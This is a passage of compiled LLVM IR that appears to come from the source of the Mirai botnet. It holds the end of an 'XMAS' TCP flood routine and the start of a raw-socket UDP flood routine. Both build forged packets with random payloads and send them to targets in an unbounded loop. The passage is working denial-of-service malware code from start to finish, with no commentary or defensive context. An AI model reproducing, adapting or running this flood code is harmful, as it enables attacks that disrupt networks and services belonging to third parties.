  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %480

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %459

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %459

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #9
  %256 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #9
  %265 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #8
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #9
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #9
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 8
  store i32 100, i32* %342, align 4
  %343 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 4
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 9
  store i32 %348, i32* %350, align 4
  %351 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %351, i64 %353
  %355 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %354, i32 0, i32 3
  %356 = load i16, i16* %355, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 0
  store i16 %356, i16* %358, align 4
  %359 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %362, i32 0, i32 4
  %364 = load i16, i16* %363, align 2
  %365 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  %367 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %370, i32 0, i32 2
  %372 = load i32, i32* %371, align 4
  %373 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 2
  store i32 %372, i32* %374, align 4
  %375 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %378, i32 0, i32 1
  %380 = load i32, i32* %379, align 4
  %381 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 3
  store i32 %380, i32* %382, align 4
  %383 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 4
  %385 = load i16, i16* %384, align 4
  %386 = and i16 %385, -241
  %387 = or i16 %386, 128
  store i16 %387, i16* %384, align 4
  %388 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = and i16 %390, -257
  %392 = or i16 %391, 256
  store i16 %392, i16* %389, align 4
  %393 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 4
  %395 = load i16, i16* %394, align 4
  %396 = and i16 %395, -4097
  %397 = or i16 %396, 4096
  store i16 %397, i16* %394, align 4
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 5
  store i16 %400, i16* %402, align 2
  %403 = load i8, i8* %18, align 1
  %404 = sext i8 %403 to i16
  %405 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 4
  %407 = load i16, i16* %406, align 4
  %408 = and i16 %404, 1
  %409 = shl i16 %408, 13
  %410 = and i16 %407, -8193
  %411 = or i16 %410, %409
  store i16 %411, i16* %406, align 4
  %412 = load i8, i8* %19, align 1
  %413 = sext i8 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 4
  %416 = load i16, i16* %415, align 4
  %417 = and i16 %413, 1
  %418 = shl i16 %417, 12
  %419 = and i16 %416, -4097
  %420 = or i16 %419, %418
  store i16 %420, i16* %415, align 4
  %421 = load i8, i8* %20, align 1
  %422 = sext i8 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 4
  %425 = load i16, i16* %424, align 4
  %426 = and i16 %422, 1
  %427 = shl i16 %426, 11
  %428 = and i16 %425, -2049
  %429 = or i16 %428, %427
  store i16 %429, i16* %424, align 4
  %430 = load i8, i8* %21, align 1
  %431 = sext i8 %430 to i16
  %432 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = and i16 %431, 1
  %436 = shl i16 %435, 10
  %437 = and i16 %434, -1025
  %438 = or i16 %437, %436
  store i16 %438, i16* %433, align 4
  %439 = load i8, i8* %22, align 1
  %440 = sext i8 %439 to i16
  %441 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = and i16 %440, 1
  %445 = shl i16 %444, 9
  %446 = and i16 %443, -513
  %447 = or i16 %446, %445
  store i16 %447, i16* %442, align 4
  %448 = load i8, i8* %23, align 1
  %449 = sext i8 %448 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 4
  %452 = load i16, i16* %451, align 4
  %453 = and i16 %449, 1
  %454 = shl i16 %453, 8
  %455 = and i16 %452, -257
  %456 = or i16 %455, %454
  store i16 %456, i16* %451, align 4
  %457 = load i8*, i8** %38, align 8
  %458 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %457, i32 noundef %458)
  br label %490

459:                                              ; preds = %235, %227
  %460 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 4
  %462 = load i16, i16* %461, align 4
  %463 = lshr i16 %462, 8
  %464 = and i16 %463, 1
  %465 = zext i16 %464 to i32
  %466 = icmp ne i32 %465, 0
  br i1 %466, label %475, label %467

467:                                              ; preds = %459
  %468 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 4
  %470 = load i16, i16* %469, align 4
  %471 = lshr i16 %470, 10
  %472 = and i16 %471, 1
  %473 = zext i16 %472 to i32
  %474 = icmp ne i32 %473, 0
  br i1 %474, label %475, label %478

475:                                              ; preds = %467, %459
  %476 = load i32, i32* %26, align 4
  %477 = call i32 @close(i32 noundef %476)
  br label %121

478:                                              ; preds = %467
  br label %479

479:                                              ; preds = %478
  br label %480

480:                                              ; preds = %479, %215
  br label %481

481:                                              ; preds = %480, %211, %203
  %482 = call i64 @time(i64* noundef null) #8
  %483 = load i64, i64* %31, align 8
  %484 = sub nsw i64 %482, %483
  %485 = icmp sgt i64 %484, 10
  br i1 %485, label %486, label %489

486:                                              ; preds = %481
  %487 = load i32, i32* %26, align 4
  %488 = call i32 @close(i32 noundef %487)
  br label %121

489:                                              ; preds = %481
  br label %191

490:                                              ; preds = %338
  br label %491

491:                                              ; preds = %490, %124
  %492 = load i32, i32* %9, align 4
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %9, align 4
  br label %115, !llvm.loop !21

494:                                              ; preds = %115
  br label %495

495:                                              ; preds = %605, %494
  store i32 0, i32* %9, align 4
  br label %496

496:                                              ; preds = %602, %495
  %497 = load i32, i32* %9, align 4
  %498 = load i8, i8* %5, align 1
  %499 = zext i8 %498 to i32
  %500 = icmp slt i32 %497, %499
  br i1 %500, label %501, label %605

501:                                              ; preds = %496
  %502 = load i8**, i8*** %12, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i8*, i8** %502, i64 %504
  %506 = load i8*, i8** %505, align 8
  store i8* %506, i8** %39, align 8
  %507 = load i8*, i8** %39, align 8
  %508 = bitcast i8* %507 to %struct.iphdr*
  store %struct.iphdr* %508, %struct.iphdr** %40, align 8
  %509 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i64 1
  %511 = bitcast %struct.iphdr* %510 to %struct.tcphdr*
  store %struct.tcphdr* %511, %struct.tcphdr** %41, align 8
  %512 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i64 1
  %514 = bitcast %struct.tcphdr* %513 to i8*
  store i8* %514, i8** %42, align 8
  %515 = load i16, i16* %14, align 2
  %516 = zext i16 %515 to i32
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %524

518:                                              ; preds = %501
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i32 0, i32 3
  store i16 %521, i16* %523, align 4
  br label %524

524:                                              ; preds = %518, %501
  %525 = load i8, i8* %25, align 1
  %526 = icmp ne i8 %525, 0
  br i1 %526, label %527, label %530

527:                                              ; preds = %524
  %528 = load i8*, i8** %42, align 8
  %529 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %528, i32 noundef %529)
  br label %530

530:                                              ; preds = %527, %524
  %531 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 7
  store i16 0, i16* %532, align 2
  %533 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %534 = bitcast %struct.iphdr* %533 to i16*
  %535 = call zeroext i16 @checksum_generic(i16* noundef %534, i32 noundef 20)
  %536 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 7
  store i16 %535, i16* %537, align 2
  %538 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %539 = load i32, i32* %9, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %538, i64 %540
  %542 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %541, i32 0, i32 1
  %543 = load i32, i32* %542, align 4
  %544 = add i32 %543, 1
  store i32 %544, i32* %542, align 4
  %545 = trunc i32 %543 to i16
  %546 = call zeroext i16 @htons(i16 noundef zeroext %545) #9
  %547 = zext i16 %546 to i32
  %548 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %549 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %548, i32 0, i32 2
  store i32 %547, i32* %549, align 4
  %550 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %551 = load i32, i32* %9, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %550, i64 %552
  %554 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %553, i32 0, i32 2
  %555 = load i32, i32* %554, align 4
  %556 = trunc i32 %555 to i16
  %557 = call zeroext i16 @htons(i16 noundef zeroext %556) #9
  %558 = zext i16 %557 to i32
  %559 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 3
  store i32 %558, i32* %560, align 4
  %561 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 6
  store i16 0, i16* %562, align 4
  %563 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %564 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %565 = bitcast %struct.tcphdr* %564 to i8*
  %566 = load i32, i32* %24, align 4
  %567 = sext i32 %566 to i64
  %568 = add i64 20, %567
  %569 = trunc i64 %568 to i16
  %570 = call zeroext i16 @htons(i16 noundef zeroext %569) #9
  %571 = load i32, i32* %24, align 4
  %572 = sext i32 %571 to i64
  %573 = add i64 20, %572
  %574 = trunc i64 %573 to i32
  %575 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %563, i8* noundef %565, i16 noundef zeroext %570, i32 noundef %574)
  %576 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 6
  store i16 %575, i16* %577, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 1
  %580 = load i16, i16* %579, align 2
  %581 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %582 = load i32, i32* %9, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %581, i64 %583
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i32 0, i32 0
  %586 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %585, i32 0, i32 1
  store i16 %580, i16* %586, align 2
  %587 = load i32, i32* %10, align 4
  %588 = load i8*, i8** %39, align 8
  %589 = load i32, i32* %24, align 4
  %590 = sext i32 %589 to i64
  %591 = add i64 40, %590
  %592 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %593 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %594 = load i32, i32* %9, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %593, i64 %595
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i32 0, i32 0
  %598 = bitcast %struct.sockaddr_in* %597 to %struct.sockaddr*
  store %struct.sockaddr* %598, %struct.sockaddr** %592, align 8
  %599 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %600 = load %struct.sockaddr*, %struct.sockaddr** %599, align 8
  %601 = call i64 @sendto(i32 noundef %587, i8* noundef %588, i64 noundef %591, i32 noundef 16384, %struct.sockaddr* %600, i32 noundef 16)
  br label %602

602:                                              ; preds = %530
  %603 = load i32, i32* %9, align 4
  %604 = add nsw i32 %603, 1
  store i32 %604, i32* %9, align 4
  br label %496, !llvm.loop !22

605:                                              ; preds = %496
  br label %495

606:                                              ; preds = %202, %111, %105
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpgeneric(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 noundef %29, i64 noundef 8) #8
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 noundef zeroext %32, %struct.attack_option* noundef %33, i8 noundef zeroext 2, i32 noundef 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 3, i32 noundef 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 noundef zeroext %40, %struct.attack_option* noundef %41, i8 noundef zeroext 4, i32 noundef 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 noundef zeroext %44, %struct.attack_option* noundef %45, i8 noundef zeroext 5, i32 noundef 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 noundef zeroext %48, %struct.attack_option* noundef %49, i8 noundef zeroext 6, i32 noundef 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 7, i32 noundef 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 0, i32 noundef 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 1, i32 noundef 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 25, i32 noundef 100)
  store i32 %66, i32* %20, align 4
  %67 = load i16, i16* %18, align 2
  %68 = zext i16 %67 to i32
  %69 = icmp sgt i32 %68, 1460
  br i1 %69, label %70, label %71

70:                                               ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %71

71:                                               ; preds = %70, %4
  %72 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #8
  store i32 %72, i32* %10, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %75

74:                                               ; preds = %71
  br label %311

75:                                               ; preds = %71
  store i32 1, i32* %9, align 4
  %76 = load i32, i32* %10, align 4
  %77 = bitcast i32* %9 to i8*
  %78 = call i32 @setsockopt(i32 noundef %76, i32 noundef 0, i32 noundef 3, i8* noundef %77, i32 noundef 4) #8
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %83

80:                                               ; preds = %75
  %81 = load i32, i32* %10, align 4
  %82 = call i32 @close(i32 noundef %81)
  br label %311

83:                                               ; preds = %75
  store i32 0, i32* %9, align 4
  br label %84

84:                                               ; preds = %166, %83
  %85 = load i32, i32* %9, align 4
  %86 = load i8, i8* %5, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp slt i32 %85, %87
  br i1 %88, label %89, label %169

89:                                               ; preds = %84
  %90 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #8
  %91 = load i8**, i8*** %11, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %91, i64 %93
  store i8* %90, i8** %94, align 8
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  %99 = load i8*, i8** %98, align 8
  %100 = bitcast i8* %99 to %struct.iphdr*
  store %struct.iphdr* %100, %struct.iphdr** %21, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i64 1
  %103 = bitcast %struct.iphdr* %102 to %struct.udphdr*
  store %struct.udphdr* %103, %struct.udphdr** %22, align 8
  %104 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %105 = bitcast %struct.iphdr* %104 to i8*
